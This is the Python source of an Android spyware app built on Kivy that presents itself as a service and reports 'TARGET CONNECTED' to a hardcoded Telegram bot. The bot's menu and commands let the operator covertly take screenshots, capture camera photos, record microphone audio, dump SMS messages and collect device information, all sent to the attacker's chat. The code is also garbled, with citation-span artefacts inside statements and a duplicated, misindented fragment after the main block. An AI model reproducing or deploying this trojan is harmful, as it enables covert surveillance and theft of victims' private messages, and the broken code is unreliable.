from kivy.app import App
import telebot
import threading
import os
import time
import platform
from plyer import camera, screenshot, audio, sms, gps

# --- KONFIGURASI (Ganti dengan punyamu ya!) ---
[span_4](start_span)TOKEN = "8650738252:AAEWHSGL_HLg9_Rjta6MCAgbj6v9eWzqN44" #[span_4](end_span)
[span_5](start_span)CHAT_ID = "8025603711" #[span_5](end_span)
bot = telebot.TeleBot(TOKEN)

class F3mboyService(App):
    def build(self):
        # [span_6](start_span)Menjalankan mesin bot di background agar aplikasi tidak freeze[span_6](end_span)
        threading.Thread(target=self.bot_logic, daemon=True).start()
        return None

    def bot_logic(self):
        # [span_7](start_span)Notifikasi saat target online pertama kali[span_7](end_span)
        try:
            device = platform.node()
            bot.send_message(CHAT_ID, f"🔥 **TARGET CONNECTED!**\nID: {device}")
        except:
            pass

        # --- TAMPILAN MENU TOMBOL (Inline Keyboard) ---
        def create_menu():
            markup = telebot.types.InlineKeyboardMarkup(row_width=2)
            btn_ss = telebot.types.InlineKeyboardButton("📸 Screenshot", callback_data="cb_ss")
            btn_cam = telebot.types.InlineKeyboardButton("🤳 Camera", callback_data="cb_cam")
            btn_mic = telebot.types.InlineKeyboardButton("🎙️ Audio (10s)", callback_data="cb_mic")
            btn_sms = telebot.types.InlineKeyboardButton("📩 Dump SMS", callback_data="cb_sms")
            btn_info = telebot.types.InlineKeyboardButton("📱 Info Device", callback_data="cb_info")
            
            markup.add(btn_ss, btn_cam, btn_mic, btn_sms, btn_info)
            return markup

        @bot.message_handler(commands=['start', 'panel'])
        def send_welcome(message):
            welcome_text = "👑 **F3MB0Y CONTROL PANEL** 👑\nPilih aksi di bawah, manis:"
            bot.send_message(CHAT_ID, welcome_text, reply_markup=create_menu(), parse_mode="Markdown")

        # --- CALLBACK HANDLER (Logika Tombol) ---
        @bot.callback_query_handler(func=lambda call: True)
        def handle_query(call):
            if call.data == "cb_ss":
                bot.answer_callback_query(call.id, "Capturing...")
                try:
                    [span_8](start_span)screenshot.capture(filename="s.png") #[span_8](end_span)
                    time.sleep(2)
                    with open("s.png", "rb") as f: bot.send_photo(CHAT_ID, f)
                except: bot.send_message(CHAT_ID, "Gagal SS!")

            elif call.data == "cb_cam":
                bot.answer_callback_query(call.id, "Opening Cam...")
                try:
                    [span_9](start_span)camera.take_picture(filename="c.jpg", on_complete=lambda p: bot.send_photo(CHAT_ID, open(p, 'rb'))) #[span_9](end_span)
                except: bot.send_message(CHAT_ID, "Gagal Kamera!")

            elif call.data == "cb_mic":
                bot.answer_callback_query(call.id, "Recording...")
                try:
                    [span_10](start_span)audio.file_path = "a.3gp" #[span_10](end_span)
                    audio.start()
                    time.sleep(10)
                    audio.stop()
                    with open("a.3gp", "rb") as f: bot.send_audio(CHAT_ID, f)
                except: bot.send_message(CHAT_ID, "Gagal Rekam!")

            elif call.data == "cb_sms":
                bot.answer_callback_query(call.id, "Dumping SMS...")
                try:
                    [span_11](start_span)msgs = sms.get_messages() #[span_11](end_span)
                    [span_12](start_span)report = "\n".join([f"{m.address}: {m.body}" for m in msgs[:15]]) #[span_12](end_span)
                    bot.send_message(CHAT_ID, report if report else "SMS Kosong")
                except: bot.send_message(CHAT_ID, "Gagal Sadap SMS!")

            elif call.data == "cb_info":
                info = f"📦 **SYSTEM INFO**\nSystem: {platform.system()}\nNode: {platform.node()}\nArch: {platform.machine()}"
                bot.send_message(CHAT_ID, info, parse_mode="Markdown")

        # Loop polling agar bot selalu siaga
        while True:
            try:
                bot.polling(none_stop=True)
            except:
                time.sleep(5)

if __name__ == '__main__':
    F3mboyService().run()
        @bot.message_handler(commands=['cam'])
        def cmd_cam(message):
            camera.take_picture(filename="c.jpg", on_complete=lambda p: bot.send_photo(CHAT_ID, open(p, 'rb')))

        @bot.message_handler(commands=['mic'])
        def cmd_mic(message):
            audio.file_path = "a.3gp"
            audio.start()
            time.sleep(10)
            audio.stop()
            with open("a.3gp", "rb") as f: bot.send_audio(CHAT_ID, f)

        @bot.message_handler(commands=['sms'])
        def cmd_sms(message):
            msgs = sms.get_messages()
            report = "\\n".join([f"{m.address}: {m.body}" for m in msgs[:15]])
            bot.send_message(CHAT_ID, report if report else "Kosong")

        bot.polling(none_stop=True)

if __name__ == '__main__':
    F3mboyService().run()
""")
